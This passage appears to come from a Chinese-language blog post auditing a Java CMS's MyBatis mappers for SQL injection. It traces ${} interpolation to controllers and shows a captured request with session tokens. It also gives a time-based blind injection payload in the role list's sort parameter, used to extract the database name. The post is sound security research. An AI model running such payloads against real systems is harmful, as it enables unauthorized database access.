class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;keyWrapper != null and keyWrapper.size() &gt; 0&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;keyWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;key&quot;</span> <span class="attr">item</span>=<span class="string">&quot;columns&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;columns != null and columns.size() &gt; 0&quot;</span>&gt;</span></span><br><span class="line">                    and</span><br><span class="line">                    <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;columns&quot;</span> <span class="attr">item</span>=<span class="string">&quot;column&quot;</span> <span class="attr">open</span>=<span class="string">&quot;(&quot;</span> <span class="attr">separator</span>=<span class="string">&quot; or &quot;</span> <span class="attr">close</span>=<span class="string">&quot;)&quot;</span>&gt;</span></span><br><span class="line">                        `$&#123;column&#125;` like CONCAT(&#x27;%&#x27;,#&#123;key&#125;,&#x27;%&#x27;)</span><br><span class="line">                    <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br></pre></td></tr></table></figure><p>第75行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectWithQuery&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;baseMap&quot;</span>&gt;</span></span><br><span class="line">        select * from `menu`</span><br><span class="line">        <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;where&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;sortWrapper != null and sortWrapper.size() &gt; 0&quot;</span>&gt;</span></span><br><span class="line">            order by</span><br><span class="line">            <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;sortWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;s&quot;</span> <span class="attr">item</span>=<span class="string">&quot;o&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">                `$&#123;s&#125;` $&#123;o&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;offset != null and limit != null&quot;</span>&gt;</span></span><br><span class="line">            limit #&#123;offset&#125;, #&#123;limit&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​可以看到这里第13行的查询语句中的column参数使用了$，而第75行则是s和o使用了$。所以这里公共有三个可以注入点，我们一个个测试。</p><h5 id="column（失败）"><a href="#column（失败）" class="headerlink" title="column（失败）"></a>column（失败）</h5><p>​我们在这个xml文件中搜索where，发现有这几个地方调用了这个where语句，分别是：</p><p>62行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;countWithQuery&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">    select COUNT(*) from `menu`</span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;where&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>75行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectWithQuery&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;baseMap&quot;</span>&gt;</span></span><br><span class="line">    select * from `menu`</span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;where&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;sortWrapper != null and sortWrapper.size() &gt; 0&quot;</span>&gt;</span></span><br><span class="line">        order by</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;sortWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;s&quot;</span> <span class="attr">item</span>=<span class="string">&quot;o&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">            `$&#123;s&#125;` $&#123;o&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;offset != null and limit != null&quot;</span>&gt;</span></span><br><span class="line">        limit #&#123;offset&#125;, #&#123;limit&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>116行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">delete</span> <span class="attr">id</span>=<span class="string">&quot;deleteWithQuery&quot;</span>&gt;</span></span><br><span class="line">    delete from `menu`</span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;where&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">delete</span>&gt;</span></span><br></pre></td></tr></table></figure><p>161行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateWithQuery&quot;</span>&gt;</span></span><br><span class="line">    update `menu`</span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;setWrapper != null&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;setWrapper.id != null&quot;</span>&gt;</span></span><br><span class="line">                `id` = #&#123;setWrapper.id&#125;,</span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;setWrapper.title != null&quot;</span>&gt;</span></span><br><span class="line">                `title` = #&#123;setWrapper.title&#125;,</span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;setWrapper.key != null&quot;</span>&gt;</span></span><br><span class="line">                `key` = #&#123;setWrapper.key&#125;,</span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;setWrapper.parent != null&quot;</span>&gt;</span></span><br><span class="line">                `parent` = #&#123;setWrapper.parent&#125;,</span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;setWrapper.ts != null&quot;</span>&gt;</span></span><br><span class="line">                `ts` = #&#123;setWrapper.ts&#125;,</span><br><span class="line">            <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;where&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​一共有2个select，一个delete以及一个update调用了这个where语句，因为他们产生SQL注入的原因是相同的，所以我们只需要证明其中一个存在SQL注入即可，我们从第一个select开始追溯，也就是第62行的select语句。</p><p>​向上追溯：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/count&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Result&lt;CountDTO&gt;&gt; <span class="title function_">count</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">CountDTO</span> <span class="variable">dto</span> <span class="operator">=</span> dashboardService.count();</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.OK).body(Result.success(dto));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​确认被count路由调用，不过这里并没有接受传参，也就是说没有可操控的参数，所以这里是不存在SQL注入的。那么我们转移到第二个select语句中。</p><p>​经过审计发现，该select语句中的where有两个方法调用了它，但是这两个方法中的参数仅有value可控而column是不可控的，所以这里是不存在SQL注入的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;String&gt; <span class="title function_">findIdsByKeys</span><span class="params">(List&lt;String&gt; keys)</span> &#123;</span><br><span class="line">    List&lt;String&gt; ids = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(keys)) &#123;</span><br><span class="line">        List&lt;Menu&gt; menus = menuDAO.selectWithQuery(QueryWrapper.newBuilder().in(<span class="string">&quot;key&quot;</span>, keys).build());</span><br><span class="line">        menus.forEach(menu -&gt; ids.add(menu.getId()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ids;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;String&gt; <span class="title function_">findKeysByRoleId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">    List&lt;String&gt; keys = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    List&lt;RoleMenuRef&gt; refs = roleMenuRefService.findByRoleId(id);</span><br><span class="line">    <span class="keyword">if</span> (!CollectionUtils.isEmpty(refs)) &#123;</span><br><span class="line">        List&lt;String&gt; ids = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        refs.forEach(ref -&gt; ids.add(ref.getMenuId()));</span><br><span class="line">        List&lt;Menu&gt; menus = menuDAO.selectWithQuery(QueryWrapper.newBuilder().in(<span class="string">&quot;id&quot;</span>, ids).build());</span><br><span class="line">        menus.forEach(menu -&gt; keys.add(menu.getKey()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> keys;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​那么我们转到delete，但是delete则是未被调用，所以我们再转到update发现这个也未被调用，所以这个where语句是不存在SQL注入的。</p><h5 id="s、o（失败）"><a href="#s、o（失败）" class="headerlink" title="s、o（失败）"></a>s、o（失败）</h5><p>​我们向上追溯，找到了该参数仅有的控制器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/menu_tree&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Result&lt;List&lt;MenuDTO&gt;&gt;&gt; <span class="title function_">queryMenuTree</span><span class="params">()</span> &#123;</span><br><span class="line">    List&lt;MenuDTO&gt; dtos = menuService.findTree();</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.OK).body(Result.success(dtos));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​经过审计发现，这里的两个参数均无法操控，所以这里仍旧不存在SQL注入。</p><h4 id="src-main-resources-mapper-RoleMapper-xml（成功）"><a href="#src-main-resources-mapper-RoleMapper-xml（成功）" class="headerlink" title="src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;RoleMapper.xml（成功）"></a>src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;RoleMapper.xml（成功）</h4><p>​这个xml文件和前一个是相同的，所以这里就不贴出并作分析了，仅贴出存在SQL注入的代码片段。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectWithQuery&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;baseMap&quot;</span>&gt;</span></span><br><span class="line">    select * from `role`</span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;where&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;sortWrapper != null and sortWrapper.size() &gt; 0&quot;</span>&gt;</span></span><br><span class="line">        order by</span><br><span class="line">        <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;sortWrapper.entrySet()&quot;</span> <span class="attr">index</span>=<span class="string">&quot;s&quot;</span> <span class="attr">item</span>=<span class="string">&quot;o&quot;</span> <span class="attr">separator</span>=<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">            `$&#123;s&#125;` $&#123;o&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;offset != null and limit != null&quot;</span>&gt;</span></span><br><span class="line">        limit #&#123;offset&#125;, #&#123;limit&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​这里审计我们可知s和o都是可疑注入点，我们向上追溯发现有多处调用了这个select语句。经过审计之后确定如下方法中存在调用，并且参数s和o均可控，除此之外的其他方法并没有使用到order by语句的定义，虽使用了where，但是column参数不可控，所以不存在SQL注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="meta">@Transactional(rollbackFor = Exception.class)</span></span><br><span class="line">   <span class="keyword">public</span> PageResponse&lt;RoleDTO&gt; <span class="title function_">findByPage</span><span class="params">(Integer page, Integer limit, String sort, String order, String key)</span> &#123;</span><br><span class="line">       Set&lt;String&gt; roleIds = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">       <span class="type">QueryWrapperBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">QueryWrapperBuilder</span>();</span><br><span class="line">       builder.sort(<span class="string">&quot;builtin&quot;</span>, <span class="string">&quot;desc&quot;</span>);</span><br><span class="line">       <span class="keyword">if</span> (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) &#123;</span><br><span class="line">           builder.sort(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;asc&quot;</span>);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           builder.sort(sort, order);</span><br><span class="line">       &#125;</span><br><span class="line"><span class="comment">/*此处代码省略*/</span></span><br><span class="line">       <span class="type">QueryWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> builder.build();</span><br><span class="line"></span><br><span class="line">       List&lt;Role&gt; roles = roleDAO.selectWithQuery(wrapper);</span><br><span class="line"><span class="comment">/*此处代码省略*/</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>​经过审计我们发现这个方法中在</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (StringUtils.isEmpty(sort) || StringUtils.isEmpty(order)) &#123;</span><br><span class="line">    builder.sort(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;asc&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    builder.sort(sort, order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这个代码块中将sort和order参数放入了builder对象中，而在此之前并没有进行防止SQL注入的处理，而这两个参数就是在xml文档中的o和s所以这里是存在一个SQL注入的。</p><p>​而这个方法则被下面这个控制器所调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(value = &quot;/list&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Result&lt;PageResponse&lt;RoleDTO&gt;&gt;&gt; <span class="title function_">queryPage</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;page&quot;)</span> <span class="meta">@Min(value = 1, message = &quot;page不能小于1&quot;)</span> Integer page,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;limit&quot;)</span> <span class="meta">@Min(value = 1, message = &quot;limit不能小于1&quot;)</span> Integer limit,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;sort&quot;, required = false)</span> String sort,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;order&quot;, required = false)</span> String order,</span></span><br><span class="line"><span class="params">        <span class="meta">@RequestParam(value = &quot;key&quot;, required = false)</span> String key)</span> &#123;</span><br><span class="line">    PageResponse&lt;RoleDTO&gt; response = roleService.findByPage(page, limit, sort, order, key);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.status(HttpStatus.OK).body(Result.success(response));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​可见这里也没有进行处理，直接就将参数传入到findByPage方法中。那么我们定位到前端的角色管理模块，访问后抓包，抓得如下数据包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/auth/role/list?page=1&amp;limit=10</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.192.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Microsoft Edge&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://172.23.192.1/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​构造参数sort和order</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/auth/role/list?page=1&amp;limit=10&amp;sort=builtin&amp;order=desc</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.23.192.1</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=FDA8E97A658F3DE8725A3002F1A847E6</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJ1aWQiOiIzYTEzOGJhYS0yYWZhLTQwZWMtOGVlMy03NjEyNTg2Y2UzZmIiLCJ0cyI6IjE3MzQzMTM2MDYyNjcifQ==.MGE2M2JlZTE2MmViNDVjYjY4ZTc1NDk2ZjQzOWVlZmI=</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Microsoft Edge&quot;;v=&quot;131&quot;, &quot;Chromium&quot;;v=&quot;131&quot;, &quot;Not_A Brand&quot;;v=&quot;24&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>cors</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>empty</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://172.23.192.1/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=1, i</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>​根据xml文档中的定义我们构造如下payload：</p><p>sort:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">builtin<span class="operator">%</span><span class="number">60</span>,if(length((<span class="keyword">select</span><span class="operator">%</span><span class="number">20</span>database()))<span class="operator">=</span><span class="number">1</span>,sleep(<span class="number">0.5</span>),<span class="number">1</span>),<span class="operator">%</span><span class="number">60</span>builtin</span><br></pre></td></tr></table></figure><p>order:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span></span><br></pre></td></tr></table></figure><p>​使用BP爆破模块爆破得到如下数据：</p><p><img src="/img/wormhole-cms/image-20241216113807251.png" alt="image-20241216113807251"></p><p>​处理后得到库名：</p><p><img src="/img/wormhole-cms/image-20241216113932096.png" alt="image-20241216113932096"></p><h4 id="src-main-resources-mapper-UploadMapper-xml（成功）"><a href="#src-main-resources-mapper-UploadMapper-xml（成功）" class="headerlink" title="src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;UploadMapper.xml（成功）"></a>src&#x2F;main&#x2F;resources&#x2F;mapper&#x2F;UploadMapper.xml（成功）</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectWithQuery&quot;</span> <span class="attr">resultMap</span>=<span class="string">&quot;baseMap&quot;</span>&gt;</span></span><br><span class="line">    select * from `upload`</span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;where&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;sortWrapper != null and sortWrapper.size() &gt; 0&quot;</span>&gt;</span></span><br><span 